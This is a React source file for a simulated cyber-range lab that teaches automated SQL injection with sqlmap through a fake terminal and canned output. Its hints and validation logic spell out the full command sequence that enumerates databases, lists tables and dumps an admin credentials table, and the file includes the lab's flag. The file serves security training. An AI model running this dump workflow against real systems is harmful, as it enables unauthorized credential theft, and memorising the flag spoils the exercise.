'use client';

import React, { useState, useRef, useEffect } from 'react';
import LabWorkspace from '@/components/LabWorkspace';

export default function SqlmapSimulationLab() {
  const [history, setHistory] = useState<{ cmd: string, output: React.ReactNode }[]>([
    { 
      cmd: '', 
      output: <span className="text-cyan">Zentrion Cyber Range Terminal - Type 'help' for available commands.</span>
    }
  ]);
  const [input, setInput] = useState('');
  const [isSolved, setIsSolved] = useState(false);
  const [isSimulating, setIsSimulating] = useState(false);

  const endOfTerminalRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    endOfTerminalRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [history]);

  const simulateSqlmap = (cmdStr: string, mode: 'dbs' | 'tables' | 'dump') => {
    setIsSimulating(true);
    setHistory(prev => [...prev, { cmd: cmdStr, output: '' }]);

    let step = 0;
    const interval = setInterval(() => {
      step++;
      
      if (step === 1) {
        setHistory(prev => {
          const newHist = [...prev];
          newHist[newHist.length - 1].output = (
            <div className="text-gray-300">
              <span className="text-cyan-400">        ___</span><br/>
              <span className="text-cyan-400">       __H__</span><br/>
              <span className="text-cyan-400"> ___ ___[)]_____ ___ ___  {'{'}1.7.3#stable{'}'}</span><br/>
              <span className="text-cyan-400">|_ -| . [']     | .'| . |</span><br/>
              <span className="text-cyan-400">|___|_  ["]_|_|_|__,|  _|</span><br/>
              <span className="text-cyan-400">      |_|V...       |_|   https://sqlmap.org</span><br/><br/>
              [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal.<br/>
              [*] starting @ 2026-10-03 15:00:00 /2026-10-03/
            </div>
          );
          return newHist;
        });
      } else if (step === 2) {
        setHistory(prev => {
          const newHist = [...prev];
          newHist[newHist.length - 1].output = (
            <div className="text-gray-300">
              {newHist[newHist.length - 1].output}
              <br/><br/>[15:00:01] [INFO] testing connection to the target URL
              <br/>[15:00:01] [INFO] checking if the target is protected by some kind of WAF/IPS
              <br/>[15:00:02] [INFO] testing if GET parameter 'id' is dynamic
              <br/>[15:00:02] [INFO] GET parameter 'id' appears to be dynamic
            </div>
          );
          return newHist;
        });
      } else if (step === 3) {
        setHistory(prev => {
          const newHist = [...prev];
          newHist[newHist.length - 1].output = (
            <div className="text-gray-300">
              {newHist[newHist.length - 1].output}
              <br/>[15:00:02] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
              <br/>[15:00:03] [INFO] testing for SQL injection on GET parameter 'id'
              <br/>[15:00:03] [INFO] GET parameter 'id' is 'MySQL {'>'}= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
            </div>
          );
          return newHist;
        });
      } else if (step === 4) {
        setHistory(prev => {
          const newHist = [...prev];
          let finalOutput = <></>;
          
          if (mode === 'dbs') {
            finalOutput = (
              <div className="text-green-400 font-bold mt-2">
                available databases [2]:<br/>
                [*] information_schema<br/>
                [*] zentrion_corp
              </div>
            );
          } else if (mode === 'tables') {
            finalOutput = (
              <div className="text-green-400 font-bold mt-2">
                Database: zentrion_corp<br/>
                [3 tables]<br/>
                +-------------------+<br/>
                | admin_creds       |<br/>
                | products          |<br/>
                | users             |<br/>
                +-------------------+
              </div>
            );
          } else if (mode === 'dump') {
            finalOutput = (
              <div className="text-green-400 font-bold mt-2">
                Database: zentrion_corp<br/>
                Table: admin_creds<br/>
                [1 entry]<br/>
                +----+----------------+--------------------------------------+<br/>
                | id | username       | password                             |<br/>
                +----+----------------+--------------------------------------+<br/>
                | 1  | administrator  | ZENTRION{'{'}sqlm4p_4ut0m4t3d_pwnd{'}'} |<br/>
                +----+----------------+--------------------------------------+
              </div>
            );
            setIsSolved(true);
          }

          newHist[newHist.length - 1].output = (
            <div className="text-gray-300">
              {newHist[newHist.length - 1].output}
              <br/>[15:00:04] [INFO] fetching data...
              {finalOutput}
              <br/><br/>[*] ending @ 2026-10-03 15:00:04 /2026-10-03/
            </div>
          );
          return newHist;
        });
        clearInterval(interval);
        setIsSimulating(false);
      }
    }, 800);
  };

  const handleCommand = (e: React.FormEvent) => {
    e.preventDefault();
    if (isSimulating) return;

    const cmd = input.trim().replace(/\s+/g, ' ');
    if (!cmd) return;

    let output: React.ReactNode = '';

    if (cmd === 'clear') {
      setHistory([]);
      setInput('');
      return;
    } else if (cmd === 'help') {
      output = `sqlmap usage:\n\nsqlmap -u [target_url] --dbs                 (Enumerate databases)\nsqlmap -u [target_url] -D [db_name] --tables (Enumerate tables)\nsqlmap -u [target_url] -D [db_name] -T [table_name] --dump (Dump table data)`;
    } else if (cmd.startsWith('sqlmap ')) {
      const isTargetUrl = cmd.includes('-u "http://target.lab/view.php?id=1"') || cmd.includes("-u 'http://target.lab/view.php?id=1'") || cmd.includes('-u http://target.lab/view.php?id=1');
      
      if (!isTargetUrl) {
        output = `sqlmap error: Missing or incorrect target URL. Make sure you use: -u "http://target.lab/view.php?id=1"`;
      } else if (cmd.includes('--dbs')) {
        simulateSqlmap(cmd, 'dbs');
        setInput('');
        return;
      } else if (cmd.includes('--tables')) {
        if (cmd.includes('-D zentrion_corp')) {
          simulateSqlmap(cmd, 'tables');
          setInput('');
          return;
        } else {
          output = `sqlmap error: You must specify a database name using -D [db_name] before listing tables.`;
        }
      } else if (cmd.includes('--dump')) {
        if (cmd.includes('-D zentrion_corp') && cmd.includes('-T admin_creds')) {
          simulateSqlmap(cmd, 'dump');
          setInput('');
          return;
        } else {
          output = `sqlmap error: You must specify both a database (-D [db_name]) and a table (-T [table_name]) to dump.`;
        }
      } else {
        output = `sqlmap error: Missing action flag (--dbs, --tables, or --dump).`;
      }
    } else {
      output = `bash: ${cmd.split(' ')[0]}: command not found`;
    }

    setHistory([...history, { cmd, output }]);
    setInput('');
  };

  const missionBriefing = (
    <>
      <p className="mb-3">
        <strong>SQLMap</strong> is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over database servers.
      </p>
      <p className="mb-3">
        Your reconnaissance has discovered a vulnerable web endpoint: <br/>
        <code>http://target.lab/view.php?id=1</code>
      </p>
      <div className="p-3 bg-void rounded border border-line mt-4">
        <span className="text-xs font-mono text-cyan-400 block mb-1">Target:</span>
        <span className="text-sm text-white">Use <code>sqlmap</code> to automate the exploitation of this SQL injection flaw. First, enumerate the databases, then find the tables, and finally dump the credentials table to extract the flag.</span>
      </div>
    </>
  );

  const hints = [
    "Step 1: Find databases. Run: sqlmap -u \"http://target.lab/view.php?id=1\" --dbs",
    "Step 2: Find tables in the zentrion_corp DB. Run: sqlmap -u \"http://target.lab/view.php?id=1\" -D zentrion_corp --tables",
    "Step 3: Dump the admin_creds table. Run: sqlmap -u \"http://target.lab/view.php?id=1\" -D zentrion_corp -T admin_creds --dump"
  ];

  return (
    <LabWorkspace
      labId="sqlmap-simulation"
      title="Automated SQLi (SQLMap)"
      category="Offensive Security"
      difficulty="Advanced"
      missionBriefing={missionBriefing}
      hints={hints}
      isSolved={isSolved}
      flagId="ZENTRION{sqlm4p_4ut0m4t3d_pwnd}"
    >
      <div className="flex flex-col h-full bg-[#0a0a0f]">
        {/* Top Navbar Simulation */}
        <div className="px-6 py-4 border-b border-line bg-surface/30 flex items-center justify-between">
          <h3 className="text-white font-bold text-lg flex items-center gap-2">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" className="text-cyan-400"><ellipse cx="12" cy="5" rx="9" ry="3"></ellipse><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"></path><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"></path></svg>
            Attacker Terminal (Kali Linux)
          </h3>
          <span className="px-3 py-1 bg-cyan-500/20 border border-cyan-500/30 text-cyan-300 text-xs font-mono rounded">
            SQLMap v1.7.3 Simulation
          </span>
        </div>

        {/* Workspace Layout */}
        <div className="flex-1 p-6 flex flex-col h-full">
          <div className="w-full flex-1 flex flex-col border border-line bg-void rounded-xl overflow-hidden font-mono shadow-[0_0_30px_rgba(34,211,238,0.05)]">
            {/* Terminal Header */}
            <div className="flex items-center gap-2 p-3 bg-surface border-b border-line">
              <div className="w-3 h-3 rounded-full bg-red-500"></div>
              <div className="w-3 h-3 rounded-full bg-yellow-500"></div>
              <div className="w-3 h-3 rounded-full bg-green-500"></div>
              <span className="text-xs text-mute ml-2">attacker@kali:~/tools/sqlmap</span>
            </div>

            {/* Terminal Body */}
            <div 
              className="flex-1 p-4 overflow-y-auto text-sm text-gray-300 whitespace-pre-wrap"
              onClick={() => document.getElementById('terminal-input')?.focus()}
            >
              {history.map((h, i) => (
                <div key={i} className="mb-4">
                  {h.cmd !== '' && (
                    <div className="flex text-white">
                      <span className="text-cyan-400 mr-2 font-bold">┌──(attacker㉿kali)-[~/tools]</span>
                      <br/>
                      <span className="text-cyan-400 mr-2 font-bold">└─$</span>
                      {h.cmd}
                    </div>
                  )}
                  {h.output && (
                    <div className="mt-1 text-gray-400 leading-relaxed">
                      {h.output}
                    </div>
                  )}
                </div>
              ))}

              {/* Input Line */}
              <form onSubmit={handleCommand} className="flex flex-col text-white mt-2">
                <span className="text-cyan-400 mr-2 font-bold">┌──(attacker㉿kali)-[~/tools]</span>
                <div className="flex">
                  <span className="text-cyan-400 mr-2 font-bold">└─$</span>
                  <input
                    id="terminal-input"
                    type="text"
                    value={input}
                    onChange={(e) => setInput(e.target.value)}
                    disabled={isSimulating}
                    className="flex-1 bg-transparent border-none outline-none text-white focus:ring-0 p-0 disabled:opacity-50"
                    autoFocus
                    autoComplete="off"
                    spellCheck="false"
                  />
                </div>
              </form>
              <div ref={endOfTerminalRef} />
            </div>
          </div>
        </div>
      </div>
    </LabWorkspace>
  );
}
